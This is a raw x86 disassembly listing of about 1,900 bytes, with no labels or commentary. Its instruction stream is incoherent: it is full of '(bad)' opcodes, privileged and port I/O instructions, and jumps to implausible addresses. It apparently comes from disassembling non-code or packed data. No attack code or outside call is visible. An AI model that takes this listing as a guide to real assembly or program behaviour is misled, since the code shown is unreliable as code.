  43079d:	mov    al,ds:0xc1ff39ce
  4307a2:	adc    al,0xc6
  4307a4:	inc    ebp
  4307a5:	and    eax,0x9c0f4c85
  4307aa:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4307b1:	cmp    BYTE PTR [ebx+0x39],0x0
  4307b5:	mov    dh,0xc7
  4307b7:	cmp    eax,eax
  4307b9:	jne    0x45440005
  4307bf:	mov    edi,DWORD PTR [ebx]
  4307c1:	mov    eax,0x848bcb9c
  4307c6:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  4307cd:	or     BYTE PTR [edi],cl
  4307cf:	(bad)  
  4307d0:	dec    ebp
  4307d1:	inc    edi
  4307d2:	add    bh,0x53
  4307d5:	or     cl,ch
  4307d7:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4307dd:	xchg   BYTE PTR [eax-0x1638ac64],al
  4307e3:	mov    esp,0xf802b588
  4307e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4307e9:	inc    ebp
  4307ea:	(bad)  
  4307eb:	cmp    edi,edi
  4307ed:	pushf  
  4307ee:	or     DWORD PTR [ecx+0x45ffe474],0x0
  4307f5:	mov    ecx,DWORD PTR [ebp-0x340018]
  4307fb:	into   
  4307fc:	dec    DWORD PTR [ebx-0x7f72431c]
  430802:	push   0x5000ff01
  430807:	retf   
  430808:	inc    ebp
  430809:	into   
  43080a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430810:	push   eax
  430811:	into   
  430812:	call   0x4b0ca2
  430817:	retf   
  430818:	add    dh,cl
  43081a:	add    bh,bh
  43081c:	mov    DWORD PTR [eax+ecx*1],edx
  43081f:	clc    
  430820:	inc    ebp
  430821:	inc    ebp
  430822:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  430828:	push   0x1
  43082a:	push   edi
  43082b:	add    BYTE PTR [eax-0x35],dl
  43082e:	mov    ecx,esi
  430830:	cld    
  430831:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  430837:	into   
  430838:	ror    BYTE PTR [ebx+0x75000800],0x50
  43083f:	xor    eax,DWORD PTR [ebp+0x3]
  430842:	jne    0x430895
  430844:	call   DWORD PTR [eax-0x3c]
  430847:	mov    DWORD PTR [ecx-0x18],edx
  43084a:	mov    edi,edi
  43084c:	call   0x8b464dd5
  430851:	add    ah,ah
  430853:	rol    BYTE PTR [ebp-0x7c],0xeb
  430857:	add    edi,edi
  430859:	add    al,ch
  43085b:	inc    ebp
  43085c:	push   ecx
  43085d:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  430863:	mov    al,0xc7
  430865:	test   esp,esp
  430867:	clc    
  430868:	test   DWORD PTR [ebp-0x8],ecx
  43086b:	add    BYTE PTR [ebp+0x53],0x34
  43086f:	jmp    0x8bcc9110
  430874:	in     al,dx
  430875:	or     BYTE PTR [ebp-0xf],al
  430878:	xor    eax,DWORD PTR [eax+0x4f896603]
  43087e:	hlt    
  43087f:	mov    eax,DWORD PTR [ebp-0x50]
  430882:	xor    esi,ecx
  430884:	add    eax,DWORD PTR [eax+0x4f086689]
  43088a:	inc    ebp
  43088b:	adc    ebp,0x68
  43088e:	pushf  
  43088f:	inc    edi
  430891:	add    al,ch
  430893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430894:	test   edi,edi
  430896:	clc    
  430897:	inc    DWORD PTR [ebp-0x73]
  43089a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43089e:	(bad)  
  43089f:	push   ecx
  4308a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308a1:	jne    0x430828
  4308a3:	push   eax
  4308a4:	clc    
  4308a5:	test   DWORD PTR [ebp-0x1],eax
  4308a8:	cmp    bh,bh
  4308aa:	pushf  
  4308ab:	mov    eax,edi
  4308ad:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4308b4:	inc    ebp
  4308b5:	push   edi
  4308b6:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  4308be:	dec    ebp
  4308bf:	add    BYTE PTR [ebx],dh
  4308c1:	inc    ebp
  4308c2:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4308c8:	enter  0x8401,0x0
  4308cc:	add    al,BYTE PTR [eax]
  4308ce:	add    bh,bh
  4308d0:	out    dx,eax
  4308d1:	sbb    BYTE PTR [eax],al
  4308d3:	dec    ebp
  4308d4:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4308da:	sub    esi,DWORD PTR [ebx]
  4308dc:	mov    ebp,DWORD PTR [eax-0x8]
  4308df:	add    bl,0x0
  4308e2:	(bad)  
  4308e3:	cmp    eax,ecx
  4308e5:	or     BYTE PTR [edx+0x750114],al
  4308eb:	inc    DWORD PTR [ebp+0x18]
  4308ee:	mov    eax,DWORD PTR [ebp-0x8]
  4308f1:	mov    ebx,eax
  4308f3:	(bad)  
  4308f4:	retf   
  4308f5:	inc    ebp
  4308f6:	into   
  4308f7:	mov    esi,eax
  4308f9:	int3   
  4308fa:	scas   eax,DWORD PTR es:[edi]
  4308fb:	push   es
  4308fc:	mov    esi,DWORD PTR [ebp-0xc]
  4308ff:	call   DWORD PTR [ebp+0x18]
  430902:	sub    edi,DWORD PTR [ebp+0x3b]
  430905:	mov    esi,DWORD PTR [edi-0x34]
  430908:	mov    eax,DWORD PTR [ebp-0x8]
  43090b:	xor    eax,0xc7c69cc3
  430910:	mov    esp,0x8b8500dc
  430915:	clc    
  430916:	mov    esp,0x338b4d45
  43091b:	in     al,0x33
  43091d:	ret    
  43091e:	add    eax,esi
  430920:	add    eax,DWORD PTR [ebp+0xf]
  430923:	mov    eax,ecx
  430925:	in     al,0x4d
  430927:	ret    
  430928:	mov    eax,esi
  43092a:	in     al,dx
  43092b:	inc    ebp
  43092c:	rol    edi,1
  43092e:	sar    al,1
  430930:	or     BYTE PTR [ebp+0x45e9f845],al
  430936:	add    BYTE PTR [ebx],bh
  430938:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43093f:	test   ebx,eax
  430941:	clc    
  430942:	retf   
  430943:	inc    ebp
  430944:	into   
  430945:	cmp    esi,eax
  430947:	pushf  
  430948:	scas   eax,DWORD PTR es:[edi]
  430949:	(bad)  
  43094a:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430951:	inc    ebp
  430952:	cmp    edi,DWORD PTR [edi]
  430954:	ja     0x4308f2
  430956:	mov    eax,edi
  430958:	mov    esp,0x458567a8
  43095d:	clc    
  43095e:	mov    eax,DWORD PTR [ebp-0x8]
  430961:	mov    eax,ebx
  430963:	in     al,dx
  430964:	retf   
  430965:	ret    
  430966:	into   
  430967:	mov    dh,0x7d
  43096a:	scas   eax,DWORD PTR es:[edi]
  43096b:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430971:	add    BYTE PTR [ebx],ch
  430973:	jmp    0xba0ab3
  430978:	mov    eax,DWORD PTR [ebp-0x5c]
  43097b:	mov    eax,DWORD PTR [ebp-0x14]
  43097e:	inc    ebp
  43097f:	enter  0x458b,0xf8
  430983:	xor    eax,ebx
  430985:	add    ecx,ebx
  430987:	cmp    ecx,esi
  430989:	shufps xmm7,xmm4,0xaf
  43098d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430993:	dec    ebp
  430994:	sub    esi,DWORD PTR [ebx]
  430996:	cmp    esi,DWORD PTR [ebx]
  430998:	ja     0x43099d
  43099a:	mov    eax,DWORD PTR [ebx]
  43099c:	lods   al,BYTE PTR ds:[esi]
  43099d:	mov    db0,ecx
  4309a0:	inc    ebp
  4309a1:	dec    ebp
  4309a2:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4309a8:	retf   
  4309a9:	rol    dh,1
  4309ab:	or     al,0xce
  4309ad:	inc    ebp
  4309ae:	scas   eax,DWORD PTR es:[edi]
  4309af:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4309b5:	add    BYTE PTR [ebx],ch
  4309b7:	add    BYTE PTR [ebx],bh
  4309b9:	inc    ebp
  4309ba:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4309c0:	inc    ebp
  4309c1:	retf   
  4309c2:	mov    ecx,esi
  4309c4:	clc    
  4309c5:	(bad)  
  4309c6:	retf   
  4309c7:	scas   eax,DWORD PTR es:[edi]
  4309c8:	ret    
  4309c9:	mov    ecx,esi
  4309cb:	hlt    
  4309cc:	(bad)  
  4309cd:	push   ebp
  4309ce:	scas   eax,DWORD PTR es:[edi]
  4309cf:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4309d5:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4309db:	add    BYTE PTR [ebx],al
  4309dd:	mov    eax,eax
  4309df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e0:	inc    ebp
  4309e1:	dec    ebp
  4309e2:	xor    eax,0x89339c33
  4309e7:	add    edx,eax
  4309e9:	add    eax,DWORD PTR [ebp+0xf]
  4309ec:	xor    al,0xc1
  4309ee:	pushf  
  4309ef:	dec    ebp
  4309f0:	(bad)  
  4309f1:	mov    esi,DWORD PTR [eax-0x72e7a14]
  4309f7:	rol    BYTE PTR [ebp+0x5],1
  4309fa:	xor    eax,DWORD PTR [ebp+0x3]
  4309fd:	jmp    0x4309ea
  4309ff:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430a05:	xor    eax,DWORD PTR [ebp+0x33]
  430a08:	mov    eax,DWORD PTR [ebx]
  430a0a:	rol    BYTE PTR [ebx],1
  430a0c:	test   BYTE PTR [edi],cl
  430a0e:	call   0xb8b:0x884d32c1
  430a15:	in     al,dx
  430a16:	inc    ebp
  430a17:	shl    DWORD PTR [ebx],1
  430a19:	rol    BYTE PTR [ebx],1
  430a1b:	add    eax,0xeb4d45e0
  430a20:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430a26:	add    BYTE PTR [ebx],dh
  430a28:	inc    ebp
  430a29:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430a2f:	rdpmc  
  430a31:	rol    DWORD PTR [ebx],0x4d
  430a34:	loopne 0x4309c1
  430a36:	push   ebp
  430a37:	in     al,dx
  430a38:	mov    cl,dl
  430a3a:	adc    eax,edx
  430a3c:	jb     0x430a43
  430a3e:	add    BYTE PTR [ebp+0x45],al
  430a41:	jmp    0x4309ce
  430a43:	mov    ebx,eax
  430a45:	test   al,0xcb
  430a47:	dec    ebp
  430a48:	dec    ebp
  430a49:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430a4f:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  430a55:	dec    ebp
  430a56:	mov    al,0x8b
  430a58:	dec    ebp
  430a59:	in     al,dx
  430a5a:	xor    edx,ecx
  430a5c:	xor    edx,eax
  430a5e:	add    eax,DWORD PTR [ebp+0x3]
  430a61:	jbe    0x430a72
  430a63:	mov    eax,ecx
  430a65:	test   al,0x45
  430a67:	dec    ebp
  430a68:	mov    DWORD PTR [ebx],esi
  430a6a:	loopne 0x430a9f
  430a6c:	inc    ebp
  430a6d:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430a73:	rol    esi,0x45
  430a76:	scas   eax,DWORD PTR es:[edi]
  430a77:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430a7d:	mov    eax,ecx
  430a7f:	hlt    
  430a80:	dec    ebp
  430a81:	inc    ebp
  430a82:	mov    eax,edi
  430a84:	loopne 0x430a5e
  430a86:	retf   
  430a87:	test   esi,ecx
  430a89:	clc    
  430a8a:	scas   eax,DWORD PTR es:[edi]
  430a8b:	inc    ebp
  430a8c:	mov    eax,edi
  430a8e:	fdiv   st,st(0)
  430a90:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430a96:	call   0xf8b:0x3b9c323b
  430a9d:	fcomp  DWORD PTR [esi-0x3d]
  430aa0:	inc    esi
  430aa2:	mov    ebp,DWORD PTR [eax-0x10]
  430aa5:	inc    ebp
  430aa6:	dec    ebp
  430aa7:	xor    esi,DWORD PTR [ebx]
  430aa9:	add    eax,DWORD PTR [ebx]
  430aab:	loopne 0x430abc
  430aad:	dec    ebp
  430aae:	ror    DWORD PTR [edx+0x7233084d],0x3
  430ab5:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430abb:	lock call 0xf48b:0x894532c3
  430ac3:	rol    BYTE PTR [ebp-0x7c],1
  430ac6:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430acc:	call   edi
  430ace:	enter  0x4d45,0x8b
  430ad2:	mov    esi,eax
  430ad4:	fmul   st(3),st
  430ad6:	push   ebp
  430ad7:	dec    ebp
  430ad8:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430ade:	ret    0xc19a
  430ae1:	xor    al,BYTE PTR [esi-0x280276]
  430ae7:	dec    ebp
  430ae8:	jne    0x430b1d
  430aea:	mov    eax,DWORD PTR [ebx]
  430aec:	cld    
  430aed:	loopne 0x430a9f
  430aef:	push   ebp
  430af0:	add    DWORD PTR [eax+0x72851100],ecx
  430af6:	inc    DWORD PTR [eax]
  430af8:	inc    DWORD PTR [ebp-0x75]
  430afb:	mov    edi,esp
  430afd:	lock add bl,0x1
  430b01:	retf   
  430b02:	add    dh,al
  430b04:	xor    dh,cl
  430b06:	inc    ebp
  430b07:	scas   eax,DWORD PTR es:[edi]
  430b08:	mov    eax,DWORD PTR [ebx]
  430b0a:	shl    al,0x0
  430b0d:	inc    ebp
  430b0e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b14:	call   0x461d4c
  430b19:	ud0    eax,ecx
  430b1c:	adc    al,0x4d
  430b1e:	inc    ebp
  430b1f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430b25:	lock push 0x338055
  430b2b:	add    eax,DWORD PTR [eax]
  430b2d:	ud0    ecx,edx
  430b30:	sbb    BYTE PTR [ebp+0x5e],dl
  430b33:	xor    ecx,ecx
  430b35:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430b3c:	push   ecx
  430b3d:	add    BYTE PTR [ebp-0x38],cl
  430b40:	mov    DWORD PTR [esi-0x740004],eax
  430b46:	cld    
  430b47:	inc    ebp
  430b48:	xchg   ebx,eax
  430b49:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430b4f:	xabort 0xaf
  430b52:	icebp  
  430b53:	mov    esi,DWORD PTR [ebp-0x28]
  430b56:	(bad)  
  430b57:	retf   
  430b58:	or     ecx,eax
  430b5a:	(bad)  
  430b5b:	dec    ebp
  430b5c:	pop    es
  430b5d:	(bad)  
  430b5e:	(bad)  
  430b5f:	or     BYTE PTR [esi],al
  430b61:	jb     0x430b29
  430b63:	add    BYTE PTR [ebx],al
  430b65:	inc    ebp
  430b66:	(bad)  
  430b67:	mov    ecx,DWORD PTR [edx]
  430b69:	fadd   st(6),st
  430b6b:	ret    
  430b6c:	add    ah,BYTE PTR [esi-0x37]
  430b6f:	int    0x55
  430b71:	sub    ebp,esp
  430b73:	add    edx,DWORD PTR [ecx-0x14]
  430b76:	inc    ebp
  430b77:	inc    ebp
  430b78:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430b7e:	cld    
  430b7f:	(bad)  
  430b80:	(bad)  
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	loopne 0x430bbf
  430b84:	mov    DWORD PTR [edi],ecx
  430b86:	mov    ebp,ebp
  430b88:	clc    
  430b89:	push   eax
  430b8b:	push   DWORD PTR [ebp-0x4]
  430b8e:	mov    BYTE PTR [ebp+0xa],0xff
  430b92:	(bad)  
  430b93:	int3   
  430b94:	or     BYTE PTR [eax],al
  430b96:	(bad)  
  430b97:	lea    eax,[edi]
  430b99:	ins    BYTE PTR es:[edi],dx
  430b9a:	(bad)  
  430b9b:	inc    DWORD PTR [ecx]
  430b9d:	push   eax
  430b9e:	mov    BYTE PTR [ebp+0x9],0x8b
  430ba2:	leave  
  430ba3:	les    edx,FWORD PTR [ebp+0x0]
  430ba6:	in     al,dx
  430ba7:	call   DWORD PTR [ecx-0x75]
  430baa:	inc    ebp
  430bab:	cld    
  430bac:	mov    DWORD PTR [eax+0x8b01fc],eax
  430bb2:	cld    
  430bb3:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430bb9:	sti    
  430bba:	mov    eax,DWORD PTR [eax]
  430bbc:	clc    
  430bbd:	test   eax,esi
  430bbf:	je     0x430c36
  430bc1:	mov    eax,esi
  430bc3:	cld    
  430bc4:	add    al,0x80
  430bc6:	add    WORD PTR [ecx+0x0],ax
  430bca:	fadd   DWORD PTR [eax]
  430bcc:	mov    BYTE PTR [eax],0xd4
  430bcf:	push   0xffffffc3
  430bd1:	push   edi
  430bd2:	mov    edx,DWORD PTR [eax+0x51]
  430bd5:	pop    edi
  430bd6:	lea    ebx,[ebx-0x8]
  430bd9:	ret    0x45
  430bdc:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430be2:	xchg   eax,edi
  430be4:	mov    DWORD PTR [ebp-0x75],ecx
  430be7:	push   esi
  430be8:	clc    
  430be9:	jne    0x430bbb
  430beb:	mov    ecx,0xf8450b0b
  430bf0:	(bad)  
  430bf1:	push   cs
  430bf2:	or     BYTE PTR [ebp-0x3a],dh
  430bf5:	cmp    eax,DWORD PTR [ecx]
  430bf7:	pop    esi
  430bf8:	(bad)  
  430bf9:	or     al,0x5
  430bfb:	inc    eax
  430bfc:	leave  
  430bfd:	call   0x21994e06
  430c02:	iret   
  430c03:	inc    eax
  430c04:	leave  
  430c05:	jmp    0xd8ce4d09
  430c0a:	mov    eax,DWORD PTR [edx-0x3a]
  430c0d:	jl     0x430c03
  430c0f:	inc    eax
  430c10:	nop
  430c11:	loop   0x430c12
  430c13:	ret    
  430c14:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c1a:	add    eax,0xff45e8f8
  430c1f:	push   esi
  430c20:	push   DWORD PTR [ebp-0x39]
  430c23:	mov    eax,0x7e9da46
  430c28:	or     al,0x6
  430c2a:	push   DWORD PTR [ebp-0x3a]
  430c2d:	cmp    eax,DWORD PTR [edx]
  430c2f:	pop    esi
  430c30:	ret    
  430c31:	or     al,0x56
  430c33:	inc    ecx
  430c34:	push   ebp
  430c35:	jl     0x430c23
  430c37:	inc    edx
  430c38:	inc    ebp
  430c39:	leave  
  430c3a:	add    DWORD PTR [ecx+0x28],eax
  430c3d:	and    esp,edi
  430c3f:	inc    ecx
  430c40:	jne    0x430c29
  430c42:	add    DWORD PTR [edx+0x1c],eax
  430c45:	enter  0xc38b,0x14
  430c49:	mov    edx,DWORD PTR [edx-0x17275af]
  430c4f:	clc    
  430c50:	enter  0xd345,0x56
  430c54:	div    DWORD PTR [ebp+0x50]
  430c57:	mov    eax,0x7c80ece
  430c5c:	rol    DWORD PTR [esi],cl
  430c5e:	div    DWORD PTR [ebp+0x50]
  430c61:	cmp    ecx,edx
  430c63:	pop    esi
  430c64:	dec    BYTE PTR [edx]
  430c66:	in     al,dx
  430c67:	inc    edx
  430c68:	sub    ebp,ebp
  430c6a:	inc    eax
  430c6b:	(bad)  
  430c6c:	push   eax
  430c6d:	add    edx,DWORD PTR [eax-0x13]
  430c70:	push   edi
  430c71:	add    dh,dh
  430c73:	leave  
  430c74:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430c78:	add    BYTE PTR [ecx+0x0],dl
  430c7b:	inc    ebp
  430c7c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430c82:	add    BYTE PTR [eax-0x7fbf448],bh
  430c88:	add    al,0x2
  430c8a:	jmp    0x57eb7e4
  430c8f:	jne    0x430c79
  430c91:	mov    eax,DWORD PTR [edx]
  430c93:	or     BYTE PTR [eax],al
  430c95:	inc    ecx
  430c96:	stc    
  430c97:	jmp    0xe7824cd2
  430c9c:	jge    0x430cdf
  430c9e:	mov    esi,ebp
  430ca0:	lock ret 0x7d
  430ca4:	and    ecx,DWORD PTR [ebx-0x171777]
  430caa:	add    bh,bh
  430cac:	aad    0xd7
  430cae:	add    dh,cl
  430cb0:	clts   
  430cb2:	(bad)  
  430cb3:	call   0xffce0bb8
  430cb8:	hlt    
  430cb9:	iret   
  430cba:	jge    0x430c92
  430cbc:	rol    DWORD PTR [esi-0x80],cl
  430cbf:	cmc    
  430cc0:	or     BYTE PTR [edi-0x27],cl
  430cc3:	(bad)  
  430cc4:	out    dx,al
  430cc5:	mov    eax,DWORD PTR [ebx]
  430cc7:	(bad)  
  430cc8:	pop    esi
  430cc9:	push   es
  430cca:	cmp    al,0xe8
  430ccc:	sar    edi,0x8
  430ccf:	inc    DWORD PTR [edi]
  430cd1:	inc    esi
  430cd2:	(bad)  
  430cd3:	loop   0x430d53
  430cd5:	push   edi
  430cd6:	push   cs
  430cd7:	push   ebx
  430cd8:	add    BYTE PTR [ebx+0x24008b56],cl
  430cde:	add    BYTE PTR [ebp+0x50],al
  430ce1:	push   eax
  430ce2:	add    DWORD PTR [ebx+0x757d1834],ecx
  430ce8:	sub    edx,DWORD PTR [esi-0x24]
  430ceb:	jne    0x430ca3
  430ced:	lods   eax,DWORD PTR ds:[esi]
  430cee:	mov    edx,DWORD PTR [edx-0x34]
  430cf1:	dec    esi
  430cf2:	out    0x83,eax
  430cf4:	into   
  430cf5:	push   edi
  430cf7:	loopne 0x430cc7
  430cf9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430cfd:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d04:	rol    DWORD PTR [edx],0x8
  430d07:	mov    esp,ecx
  430d09:	cmp    DWORD PTR [ebx],0xc
  430d0c:	mov    esi,0x5001c0
  430d11:	push   eax
  430d12:	push   cs
  430d13:	push   eax
  430d14:	(bad)  
  430d15:	sub    edx,edi
  430d17:	push   esi
  430d18:	adc    al,0xcb
  430d1a:	ins    DWORD PTR es:[edi],dx
  430d1b:	mov    eax,0x203e8
  430d20:	add    al,ah
  430d22:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d29:	add    dh,al
  430d2b:	add    ah,ch
  430d2d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d33:	pop    ecx
  430d34:	or     eax,ebx
  430d36:	cli    
  430d37:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d3d:	lea    ebp,[ebx]
  430d3f:	mov    edx,DWORD PTR [edx-0x4]
  430d42:	dec    ecx
  430d43:	inc    ebp
  430d44:	shr    BYTE PTR [ebx],0x4b
  430d47:	and    al,0x0
  430d49:	(bad)  
  430d4a:	jne    0x430d91
  430d4c:	pop    eax
  430d4d:	mov    al,0x5a
  430d4f:	call   0x1420fae
  430d54:	and    al,0x85
  430d56:	push   edx
  430d57:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d5b:	dec    ebp
  430d5c:	mov    cl,0x23
  430d5e:	jmp    0x430d4c
  430d60:	mov    al,0xe7
  430d62:	call   0x1391050
  430d67:	shr    DWORD PTR [eax+ebx*2],cl
  430d6a:	lock (bad) 
  430d6c:	adc    eax,0x757f008d
  430d71:	out    0x58,eax
  430d73:	cmp    al,0x7
  430d75:	pop    edx
  430d76:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430d7d:	push   ecx
  430d7e:	cld    
  430d7f:	mov    esi,0x3b0175
  430d84:	and    al,0xb0
  430d86:	xor    BYTE PTR [edx+0x1],0x8b
  430d8a:	add    ah,bh
  430d8c:	mov    edi,DWORD PTR [ebp-0x4]
  430d8f:	psubsw mm7,QWORD PTR [edi]
  430d92:	add    DWORD PTR [ebp+0x0],ebp
  430d95:	rcr    eax,1
  430d97:	mov    edi,ecx
  430d99:	and    eax,DWORD PTR [eax]
  430d9b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430da1:	call   0x130108a
  430da6:	add    al,cl
  430da8:	mov    ebp,esi
  430daa:	aam    0x83
  430dac:	or     DWORD PTR [ecx],eax
  430dae:	jne    0x430da1
  430db0:	mov    eax,DWORD PTR [eax]
  430db2:	aam    0x0
  430db4:	dec    ebp
  430db5:	jne    0x430d42
  430db7:	cmp    ebx,eax
  430db9:	jb     0x430e08
  430dbb:	jmp    0x430d48
  430dbd:	mov    ebx,esp
  430dbf:	int3   
  430dc0:	dec    ebp
  430dc1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430dc8:	mov    edx,0x8b0a8b
  430dcd:	cmp    ecx,DWORD PTR [eax]
  430dcf:	jb     0x430da8
  430dd1:	pop    edx
  430dd2:	push   edi
  430dd3:	cli    
  430dd4:	pop    es
  430dd5:	mov    eax,ecx
  430dd7:	jb     0x430ddb
  430dd9:	add    DWORD PTR [ebx],0xa
  430ddc:	mov    eax,DWORD PTR [ebx]
  430dde:	int3   
  430ddf:	add    bh,BYTE PTR [esi+0x75d10006]
  430de5:	jmp    0x430d72
  430de7:	mov    al,0xe8
  430de9:	call   0x104106b
  430dee:	add    edx,DWORD PTR [ecx+ecx*8]
  430df1:	pop    edi
  430df2:	or     BYTE PTR [ecx-0x73],bl
  430df5:	pop    ecx
  430df6:	inc    edi
  430df7:	xor    al,0xeb
  430df9:	push   ecx
  430dfa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e00:	call   0xb20f05
  430e05:	int3   
  430e06:	sbb    BYTE PTR [esi],ch
  430e08:	inc    ebp
  430e09:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e0f:	call   0x9c107e
  430e14:	or     BYTE PTR [ebx-0x73],dl
  430e17:	cmp    al,0x47
  430e19:	mov    al,0x1
  430e1b:	jb     0x430e1d
  430e1d:	mov    al,0x10
  430e1f:	push   eax
  430e20:	add    al,0x75
  430e22:	add    BYTE PTR [ebx],ch
  430e24:	add    ebx,esp
  430e26:	int3   
  430e27:	jne    0x430e39
  430e29:	movsx  edx,cl
  430e2c:	add    DWORD PTR [eax],eax
  430e2e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e35:	mov    gs,edi
  430e37:	add    BYTE PTR [eax-0x50],ch
  430e3a:	add    al,ch
  430e3c:	mov    eax,DWORD PTR [ecx]
  430e3e:	sub    eax,DWORD PTR [eax]
  430e40:	jb     0x430eb7
  430e42:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e46:	jge    0x430e30
  430e48:	add    al,0x1
  430e4a:	add    DWORD PTR [eax],0x0
  430e4d:	jne    0x430e4f
  430e4f:	je     0x430e96
  430e51:	mov    eax,DWORD PTR [edi]
  430e53:	ror    BYTE PTR [ebp+0x4d],1
  430e56:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e5d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e63:	mov    DWORD PTR [ebx],ebp
  430e65:	fadd   DWORD PTR [eax+0x75]
  430e68:	inc    eax
  430e69:	pop    eax
  430e6a:	lea    ebx,[ecx+0x4f]
  430e6d:	push   0xb1000003
  430e72:	out    dx,eax
  430e73:	add    ebp,DWORD PTR [edx+edx*2]
  430e76:	add    BYTE PTR [ebx+ecx*4],bh
  430e79:	mov    ch,BYTE PTR [ebx]
  430e7b:	jb     0x430eef
  430e7d:	add    al,0x89
  430e7f:	push   eax
  430e80:	call   0x842b5bf2
  430e85:	add    DWORD PTR [eax+eax*1],eax
  430e88:	jae    0x430e9e
  430e8a:	icebp  
  430e8b:	inc    ebp
  430e8c:	mov    eax,DWORD PTR gs:[ecx]
  430e8f:	int3   
  430e90:	out    dx,al
  430e91:	loopne 0x430ee0
  430e93:	sub    eax,DWORD PTR [edx]
  430e95:	push   0xffffff83
  430e97:	pop    esi
  430e98:	push   cs
  430e99:	jl     0x430eb4
  430e9b:	add    al,0xaf
  430e9d:	xor    eax,0x832b6d00
  430ea2:	mov    eax,DWORD PTR [edx]
  430ea4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eaa:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430eb0:	inc    ebp
  430eb1:	shr    ebx,0x3
  430eb4:	or     DWORD PTR [eax],0x4
  430eb7:	push   0xffffffa5
  430eb9:	pop    esi
  430eba:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ec1:	jmp    0x430f20
  430ec3:	mov    edi,0xff0272
  430ec8:	fdivr  QWORD PTR [ebp+0x5d]
  430ecb:	push   0x4e
  430ecd:	pop    ecx
  430ece:	call   0x4352d3
  430ed3:	mov    DWORD PTR [ebx],eax
  430ed5:	in     al,0xc8
  430ed7:	rol    BYTE PTR [ebp-0x75],0xc1
  430edb:	call   0xad10bc
  430ee0:	pop    esi
  430ee1:	enter  0xceff,0x8b
  430ee5:	repz mov ecx,DWORD PTR [ebp-0x34]
  430ee9:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430ef0:	je     0x430ef2
  430ef2:	or     DWORD PTR [ebx-0x74183b24],eax
  430ef8:	jne    0x430ede
  430efa:	jmp    0x430ef5
  430efc:	push   DWORD PTR [edx-0x24]
  430eff:	push   0x4d
  430f01:	pop    ecx
  430f02:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f06:	jge    0x430f0e
  430f08:	mov    eax,eax
  430f0a:	sub    ebp,DWORD PTR [edx+0x24]
  430f0d:	pop    esi
  430f0e:	inc    ebp
  430f0f:	mov    esp,0x8b6077
  430f14:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f1a:	lods   al,BYTE PTR ds:[esi]
  430f1b:	add    BYTE PTR [ebx],bh
  430f1d:	enter  0xce73,0x49
  430f21:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f29:	stc    
  430f2a:	jge    0x430f9e
  430f2c:	jnp    0xdd42929b
  430f32:	call   0xc61008
  430f37:	fadd   st(0),st
  430f39:	dec    esi
  430f3a:	ins    BYTE PTR es:[edi],dx
  430f3b:	stc    
  430f3c:	cmp    al,0x73
  430f3e:	push   ebp
